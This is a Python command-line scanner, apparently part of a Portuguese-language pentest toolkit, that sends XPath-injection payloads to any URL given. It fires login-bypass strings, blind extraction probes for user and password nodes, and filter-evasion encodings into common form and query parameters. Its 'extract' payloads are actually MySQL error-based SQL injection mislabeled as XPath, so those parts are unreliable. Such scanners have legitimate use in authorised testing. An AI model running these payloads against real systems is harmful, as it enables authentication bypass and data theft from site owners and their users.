#!/usr/bin/env python3
"""Modulo de deteccao de XPath Injection.

Testa se o servidor e vulneravel a injecao XPath via:
  - Auth bypass — fecha filtro e injeta condicao verdadeira
  - Extract — extracao de dados via erro ou cego
  - Blind — exfiltracao character-a-character
  - Bypass — encoding e comentarios

Fluxo:
  1. Envia payloads de deteccao em parametros de busca/login
  2. Verifica se a resposta indica bypass ou extracao
  3. Se detectado, envia payloads de exploit (extract, blind)
  4. Classifica: detectado, blocked, error
  5. Retorna resultado consolidado com severidade
"""
import argparse
import asyncio
import logging
from collections.abc import Awaitable
from dataclasses import asdict, dataclass

import httpx

from mytools.core.utils import (
    Cyber,
    add_common_args,
    color,
    create_async_client,
    create_banner,
    run_main_loop,
    safe_asyncio_run,
    write_output,
)

logger = logging.getLogger("mytools.xpathinject")

_CATEGORY_MAP: dict[str, list[str]] = {
    "detect": ["always_true_string", "always_true_num", "always_true_comment", "always_true_or", "always_true_and"],
    "auth_bypass": ["admin_or", "admin_comment", "nested_true", "double_quote", "admin_true_num"],
    "extract": ["extract_version", "extract_user", "extract_database", "extract_node", "extract_all"],
    "blind": ["blind_first_char", "blind_length", "blind_substring", "blind_boolean", "blind_name"],
    "bypass": ["unicode_bypass", "comment_bypass", "whitespace_bypass", "double_encode", "null_terminator"],
}

_DETECT_PAYLOADS: list[tuple[str, str, list[str]]] = [
    (
        "always_true_string",
        "' or '1'='1",
        ["success", "welcome", "token", "result", "logged"],
    ),
    (
        "always_true_num",
        "\" or \"1\"=\"1",
        ["success", "welcome", "token", "result", "logged"],
    ),
    (
        "always_true_comment",
        "' or '1'='1' --",
        ["success", "welcome", "token", "result", "logged"],
    ),
    (
        "always_true_or",
        "') or ('1'='1",
        ["success", "welcome", "token", "result", "logged"],
    ),
    (
        "always_true_and",
        "' and '1'='1",
        ["success", "welcome", "token", "result", "logged"],
    ),
]

_AUTH_BYPASS_PAYLOADS: list[tuple[str, str, list[str]]] = [
    (
        "admin_or",
        "admin' or '1'='1",
        ["success", "welcome", "token", "dashboard", "admin"],
    ),
    (
        "admin_comment",
        "admin' or '1'='1' --",
        ["success", "welcome", "token", "dashboard", "admin"],
    ),
    (
        "nested_true",
        "' or ('1'='1",
        ["success", "welcome", "token", "result"],
    ),
    (
        "double_quote",
        "admin\" or \"1\"=\"1",
        ["success", "welcome", "token", "dashboard", "admin"],
    ),
    (
        "admin_true_num",
        "admin' or 1=1",
        ["success", "welcome", "token", "dashboard", "admin"],
    ),
]

_EXTRACT_PAYLOADS: list[tuple[str, str, list[str]]] = [
    (
        "extract_version",
        "' and 1=extractValue(1,concat(0x7e,version())) --",
        ["version", "5.", "8.", "10.", "MariaDB"],
    ),
    (
        "extract_user",
        "' and 1=extractValue(1,concat(0x7e,user())) --",
        ["user()", "root", "admin", "@"],
    ),
    (
        "extract_database",
        "' and 1=extractValue(1,concat(0x7e,database())) --",
        ["database()", "mysql", "test"],
    ),
    (
        "extract_node",
        "' and extractValue(1,concat(0x7e,@@datadir)) --",
        ["/var/", "/usr/", "datadir"],
    ),
    (
        "extract_all",
        "string(//user[1])",
        ["admin", "root", "user"],
    ),
]

_BLIND_PAYLOADS: list[tuple[str, str, list[str]]] = [
    (
        "blind_first_char",
        "' and substring(//user[1],1,1)='a' --",
        ["success", "welcome", "token"],
    ),
    (
        "blind_length",
        "' and string-length(//user[1])=5 --",
        ["success", "welcome", "token"],
    ),
    (
        "blind_substring",
        "' and substring(//password[1],1,1)='a' --",
        ["success", "welcome", "token"],
    ),
    (
        "blind_boolean",
        "' and boolean(//user) --",
        ["success", "welcome", "token"],
    ),
    (
        "blind_name",
        "' and name(//user[1])='username' --",
        ["success", "welcome", "token"],
    ),
]

_BYPASS_PAYLOADS: list[tuple[str, str, list[str]]] = [
    (
        "unicode_bypass",
        "'\u0020or\u0020'1'='1",
        ["success", "welcome", "token", "result"],
    ),
    (
        "comment_bypass",
        "'/**/or/**/'1'='1",
        ["success", "welcome", "token", "result"],
    ),
    (
        "whitespace_bypass",
        "'%20or%20'1'='1",
        ["success", "welcome", "token", "result"],
    ),
    (
        "double_encode",
        "%27%20or%20%271%27%3D%271",
        ["success", "welcome", "token", "result"],
    ),
    (
        "null_terminator",
        "' or '1'='1\x00",
        ["success", "welcome", "token", "result"],
    ),
]

_XPATH_PARAMS: list[str] = [
    "user", "username", "login", "search", "query", "name",
    "email", "id", "uid", "filter", "xpath", "find",
]


@dataclass(frozen=True, slots=True)
class XPathiAttempt:
    """Tentativa individual de XPath Injection."""

    technique: str
    category: str
    payload: str
    param: str
    method: str
    status_baseline: int
    status_test: int
    size_baseline: int
    size_test: int
    status_changed: bool
    size_changed: bool
    vulnerable: bool
    details: str
    error: str


@dataclass(frozen=True, slots=True)
class XPathiResult:
    """Resultado consolidado do scan de XPath Injection."""

    target: str
    baseline_status: int
    baseline_size: int
    tls: bool
    attempts: list[XPathiAttempt]
    vulnerable_techniques: list[str]
    blocked_techniques: list[str]
    issues: list[str]
    overall_status: str


async def _test_baseline(client: httpx.AsyncClient, url: str) -> tuple[int, int, bytes]:
    """Envia requisicao baseline para obter resposta de referencia."""
    try:
        resp = await client.get(url, follow_redirects=False)
        return resp.status_code, len(resp.content), resp.content
    except httpx.RequestError:
        return 0, 0, b""


def _check_xpath_response(
    body: bytes,
    status: int,
    indicators: list[str],
) -> bool:
    """Verifica se a resposta indica XPath injection bem-sucedido."""
    text = body.decode("utf-8", errors="ignore").lower()
    if status == 0:
        return False
    return any(indicator.lower() in text for indicator in indicators)


async def _test_detect(
    client: httpx.AsyncClient,
    base_url: str,
    baseline: tuple[int, int, bytes],
) -> list[XPathiAttempt]:
    """Testa XPath injection basico com payloads de deteccao."""
    attempts: list[XPathiAttempt] = []
    b_status, b_size, _ = baseline

    for technique, payload, indicators in _DETECT_PAYLOADS:
        for param in _XPATH_PARAMS[:6]:
            for method in ("post_form", "query"):
                try:
                    if method == "post_form":
                        resp = await client.post(
                            base_url,
                            data={param: payload},
                            follow_redirects=False,
                        )
                    else:
                        resp = await client.get(
                            base_url,
                            params={param: payload},
                            follow_redirects=False,
                        )

                    t_status = resp.status_code
                    t_size = len(resp.content)
                    status_changed = t_status != b_status
                    vulnerable = _check_xpath_response(resp.content, t_status, indicators)

                    attempts.append(XPathiAttempt(
                        technique=f"{technique}_{param}",
                        category="detect",
                        payload=payload,
                        param=param,
                        method=method,
                        status_baseline=b_status,
                        status_test=t_status,
                        size_baseline=b_size,
                        size_test=t_size,
                        status_changed=status_changed,
                        size_changed=abs(t_size - b_size) > 50,
                        vulnerable=vulnerable,
                        details=f"Status {b_status}->{t_status}" if status_changed else "Sem mudanca",
                        error="",
                    ))
                except httpx.RequestError as exc:
                    attempts.append(XPathiAttempt(
                        technique=f"{technique}_{param}",
                        category="detect",
                        payload=payload,
                        param=param,
                        method=method,
                        status_baseline=b_status,
                        status_test=0,
                        size_baseline=b_size,
                        size_test=0,
                        status_changed=False,
                        size_changed=False,
                        vulnerable=False,
                        details="",
                        error=str(exc),
                    ))

    return attempts


async def _test_auth_bypass(
    client: httpx.AsyncClient,
    base_url: str,
    baseline: tuple[int, int, bytes],
) -> list[XPathiAttempt]:
    """Testa bypass de autenticacao XPath."""
    attempts: list[XPathiAttempt] = []
    b_status, b_size, _ = baseline

    for technique, payload, indicators in _AUTH_BYPASS_PAYLOADS:
        for param in ["user", "username", "login", "name"]:
            for method in ("post_form", "query"):
                try:
                    if method == "post_form":
                        resp = await client.post(
                            base_url,
                            data={param: payload, "password": "anything"},
                            follow_redirects=False,
                        )
                    else:
                        resp = await client.get(
                            base_url,
                            params={param: payload, "password": "anything"},
                            follow_redirects=False,
                        )

                    t_status = resp.status_code
                    t_size = len(resp.content)
                    status_changed = t_status != b_status
                    vulnerable = _check_xpath_response(resp.content, t_status, indicators)

                    attempts.append(XPathiAttempt(
                        technique=f"{technique}_{param}",
                        category="auth_bypass",
                        payload=payload,
                        param=param,
                        method=method,
                        status_baseline=b_status,
                        status_test=t_status,
                        size_baseline=b_size,
                        size_test=t_size,
                        status_changed=status_changed,
                        size_changed=abs(t_size - b_size) > 50,
                        vulnerable=vulnerable,
                        details=f"Status {b_status}->{t_status}" if status_changed else "Sem mudanca",
                        error="",
                    ))
                except httpx.RequestError as exc:
                    attempts.append(XPathiAttempt(
                        technique=f"{technique}_{param}",
                        category="auth_bypass",
                        payload=payload,
                        param=param,
                        method=method,
                        status_baseline=b_status,
                        status_test=0,
                        size_baseline=b_size,
                        size_test=0,
                        status_changed=False,
                        size_changed=False,
                        vulnerable=False,
                        details="",
                        error=str(exc),
                    ))

    return attempts


async def _test_extract(
    client: httpx.AsyncClient,
    base_url: str,
    baseline: tuple[int, int, bytes],
) -> list[XPathiAttempt]:
    """Testa extracao de dados via XPath."""
    attempts: list[XPathiAttempt] = []
    b_status, b_size, _ = baseline

    for technique, payload, indicators in _EXTRACT_PAYLOADS:
        for param in ["search", "query", "xpath", "find"]:
            for method in ("post_form", "query"):
                try:
                    if method == "post_form":
                        resp = await client.post(
                            base_url,
                            data={param: payload},
                            follow_redirects=False,
                        )
                    else:
                        resp = await client.get(
                            base_url,
                            params={param: payload},
                            follow_redirects=False,
                        )

                    t_status = resp.status_code
                    t_size = len(resp.content)
                    status_changed = t_status != b_status
                    vulnerable = _check_xpath_response(resp.content, t_status, indicators)

                    attempts.append(XPathiAttempt(
                        technique=f"{technique}_{param}",
                        category="extract",
                        payload=payload,
                        param=param,
                        method=method,
                        status_baseline=b_status,
                        status_test=t_status,
                        size_baseline=b_size,
                        size_test=t_size,
                        status_changed=status_changed,
                        size_changed=abs(t_size - b_size) > 50,
                        vulnerable=vulnerable,
                        details=f"Status {b_status}->{t_status}" if status_changed else "Sem mudanca",
                        error="",
                    ))
                except httpx.RequestError as exc:
                    attempts.append(XPathiAttempt(
                        technique=f"{technique}_{param}",
                        category="extract",
                        payload=payload,
                        param=param,
                        method=method,
                        status_baseline=b_status,
                        status_test=0,
                        size_baseline=b_size,
                        size_test=0,
                        status_changed=False,
                        size_changed=False,
                        vulnerable=False,
                        details="",
                        error=str(exc),
                    ))

    return attempts


async def _test_blind(
    client: httpx.AsyncClient,
    base_url: str,
    baseline: tuple[int, int, bytes],
) -> list[XPathiAttempt]:
    """Testa XPath injection cega."""
    attempts: list[XPathiAttempt] = []
    b_status, b_size, _ = baseline

    for technique, payload, indicators in _BLIND_PAYLOADS:
        for param in ["user", "username", "uid", "name"]:
            try:
                resp = await client.get(
                    base_url,
                    params={param: payload},
                    follow_redirects=False,
                )

                t_status = resp.status_code
                t_size = len(resp.content)
                status_changed = t_status != b_status
                vulnerable = _check_xpath_response(resp.content, t_status, indicators)

                attempts.append(XPathiAttempt(
                    technique=f"{technique}_{param}",
                    category="blind",
                    payload=payload,
                    param=param,
                    method="query",
                    status_baseline=b_status,
                    status_test=t_status,
                    size_baseline=b_size,
                    size_test=t_size,
                    status_changed=status_changed,
                    size_changed=abs(t_size - b_size) > 50,
                    vulnerable=vulnerable,
                    details=f"Status {b_status}->{t_status}" if status_changed else "Sem mudanca",
                    error="",
                ))
            except httpx.RequestError as exc:
                attempts.append(XPathiAttempt(
                    technique=f"{technique}_{param}",
                    category="blind",
                    payload=payload,
                    param=param,
                    method="query",
                    status_baseline=b_status,
                    status_test=0,
                    size_baseline=b_size,
                    size_test=0,
                    status_changed=False,
                    size_changed=False,
                    vulnerable=False,
                    details="",
                    error=str(exc),
                ))

    return attempts


async def _test_bypass(
    client: httpx.AsyncClient,
    base_url: str,
    baseline: tuple[int, int, bytes],
) -> list[XPathiAttempt]:
    """Testa bypass de filtragem XPath."""
    attempts: list[XPathiAttempt] = []
    b_status, b_size, _ = baseline

    for technique, payload, indicators in _BYPASS_PAYLOADS:
        for param in ["user", "username", "search"]:
            try:
                resp = await client.post(
                    base_url,
                    data={param: payload},
                    follow_redirects=False,
                )

                t_status = resp.status_code
                t_size = len(resp.content)
                status_changed = t_status != b_status
                vulnerable = _check_xpath_response(resp.content, t_status, indicators)

                attempts.append(XPathiAttempt(
                    technique=f"{technique}_{param}",
                    category="bypass",
                    payload=payload,
                    param=param,
                    method="post_form",
                    status_baseline=b_status,
                    status_test=t_status,
                    size_baseline=b_size,
                    size_test=t_size,
                    status_changed=status_changed,
                    size_changed=abs(t_size - b_size) > 50,
                    vulnerable=vulnerable,
                    details=f"Status {b_status}->{t_status}" if status_changed else "Sem mudanca",
                    error="",
                ))
            except httpx.RequestError as exc:
                attempts.append(XPathiAttempt(
                    technique=f"{technique}_{param}",
                    category="bypass",
                    payload=payload,
                    param=param,
                    method="post_form",
                    status_baseline=b_status,
                    status_test=0,
                    size_baseline=b_size,
                    size_test=0,
                    status_changed=False,
                    size_changed=False,
                    vulnerable=False,
                    details="",
                    error=str(exc),
                ))

    return attempts


def print_results(result: XPathiResult) -> None:
    """Exibe os resultados do scan de XPath Injection."""
    print(color("\n" + "=" * 60, Cyber.GRAY))
    print(color("  XPATH INJECTION — RESULTADOS", Cyber.CYAN, Cyber.BOLD))
    print(color("=" * 60, Cyber.GRAY))

    print(color(f"  Target:     {result.target}", Cyber.WHITE))
    print(color(f"  Baseline:   {result.baseline_status} ({result.baseline_size} bytes)", Cyber.GRAY))
    print(color(f"  Total:      {len(result.attempts)} testes realizados", Cyber.GRAY))

    vuln_techs = result.vulnerable_techniques
    if vuln_techs:
        print(color(f"\n  [!] {len(vuln_techs)} TECNICAS VULNERAVEIS", Cyber.RED, Cyber.BOLD))
        for tech in vuln_techs[:10]:
            print(color(f"      [!] {tech}", Cyber.RED))
        print(color("\n  Severidade: ALTA", Cyber.RED, Cyber.BOLD))
    else:
        print(color("\n  [+] Nenhuma XPath Injection detectada", Cyber.GREEN, Cyber.BOLD))
        print(color("  Severidade: NENHUMA", Cyber.GREEN, Cyber.BOLD))

    issues = result.issues
    if issues:
        print(color(f"\n  Problemas ({len(issues)}):", Cyber.YELLOW, Cyber.BOLD))
        for issue in issues[:10]:
            print(color(f"      {issue}", Cyber.YELLOW))

    errors = [a for a in result.attempts if a.error]
    if errors:
        print(color(f"\n  Erros ({len(errors)}):", Cyber.GRAY))
        for e in errors[:3]:
            print(color(f"      {e.error[:80]}", Cyber.GRAY))

    print(color("=" * 60, Cyber.GRAY))


async def run_scan(
    target: str,
    categories: list[str],
    timeout: int,
    concurrency: int,
    output_file: str | None,
    verbose: bool,
) -> int:
    """Executa o scan XPath Injection."""
    tls = target.startswith("https")
    client = create_async_client(timeout=timeout)

    print(color(f"\n  Conectando a {target}...", Cyber.CYAN))
    baseline = await _test_baseline(client, target)
    if baseline[0] == 0:
        print(color("  [!] Falha ao conectar no alvo", Cyber.RED))
        return 1

    print(color(f"  Baseline: {baseline[0]} ({baseline[1]} bytes)", Cyber.GRAY))

    run_categories = categories or list(_CATEGORY_MAP.keys())
    all_attempts: list[XPathiAttempt] = []

    tasks: list[Awaitable[list[XPathiAttempt]]] = []
    for cat in run_categories:
        if cat == "detect":
            tasks.append(_test_detect(client, target, baseline))
        elif cat == "auth_bypass":
            tasks.append(_test_auth_bypass(client, target, baseline))
        elif cat == "extract":
            tasks.append(_test_extract(client, target, baseline))
        elif cat == "blind":
            tasks.append(_test_blind(client, target, baseline))
        elif cat == "bypass":
            tasks.append(_test_bypass(client, target, baseline))

    if tasks:
        results_list = await asyncio.gather(*tasks, return_exceptions=True)
        for r in results_list:
            if isinstance(r, list):
                all_attempts.extend(r)

    vuln_techs = [a.technique for a in all_attempts if a.vulnerable]
    blocked = [a.technique for a in all_attempts if not a.vulnerable and not a.error]
    issues: list[str] = []
    for att in all_attempts:
        if att.vulnerable:
            issues.append(f"VULN: {att.technique} - {att.details}")

    overall = "vulnerable" if vuln_techs else "secure"

    result = XPathiResult(
        target=target,
        baseline_status=baseline[0],
        baseline_size=baseline[1],
        tls=tls,
        attempts=all_attempts,
        vulnerable_techniques=vuln_techs,
        blocked_techniques=blocked,
        issues=issues,
        overall_status=overall,
    )

    print_results(result)

    if output_file:
        write_output(output_file, asdict(result))

    logger.info("XPathi scan concluido: %d testes, %d vulneraveis", len(all_attempts), len(vuln_techs))
    return 1 if vuln_techs else 0


banner_art = create_banner(
    r"""
     __   _______  _______   ______             ______           _     _  _
     \ \ / / ___ \| ____\ \ / ___ \           | ___ \         | |   | || |
      \ V /| | | | |__  \ \ | |_/ / __ _  __ _| |_/ / __ _  __| | __| || |_
       | || | | | |___ \  \ \| ___ \/ _` |/ _` |    / / _` |/ _` |/ _` | __|
       | || |_| | ___) |  \ \ | |_/ / (_| | (_| | |\ \ (_| | (_| | (_| | |_
       |_| \___/|____/    \_\ \____/ \__,_|\__, \_| \_\__,_|\__,_|\__,_|\__|
                                             __/ |
                                            |___/
    """,
    "XPath Injection — detecta injecao XPath em web apps",
)


def build_parser() -> argparse.ArgumentParser:
    """Constrói o parser de argumentos CLI."""
    parser = argparse.ArgumentParser(
        prog="mytools-xpathi",
        description="XPath Injection — detecta injecao XPath em web apps",
    )
    parser.add_argument("url", help="URL alvo (ex: https://example.com)")
    parser.add_argument(
        "-c", "--category",
        choices=list(_CATEGORY_MAP.keys()),
        help="Categoria de testes (default: todas)",
    )
    parser.add_argument("--concurrency", type=int, default=5, help="Requisicoes simultaneas (default: 5)")
    add_common_args(parser)
    return parser


def run_once(args: argparse.Namespace) -> int:
    """Executa um scan XPath Injection a partir de argumentos parseados."""
    logger.info("XPathi scan iniciado para %s", args.url)
    categories: list[str] = []
    if getattr(args, "category", None):
        categories = [args.category]
    return safe_asyncio_run(
        run_scan(
            target=args.url,
            categories=categories,
            timeout=getattr(args, "timeout", 10),
            concurrency=getattr(args, "concurrency", 5),
            output_file=getattr(args, "output", None),
            verbose=getattr(args, "verbose", False),
        ),
    )


def main() -> int:
    """Ponto de entrada principal."""
    return run_main_loop(
        parser=build_parser(),
        banner_fn=banner_art,
        run_fn=run_once,
        has_target=lambda a: bool(getattr(a, "url", None) or getattr(a, "target", None)),
        prompt="xpath> ",
        description="XPath Injection interativo.",
        example="https://target.com -c detect",
        contextual_help=(
            "Uso: <url> [opcoes]\n"
            "Exemplos:\n"
            "  https://target.com\n"
            "  https://target.com -c detect\n"
            "  https://target.com -c auth_bypass\n"
            "  https://target.com -c bypass --proxy http://127.0.0.1:8080"
        ),
    )


if __name__ == "__main__":
    raise SystemExit(main())
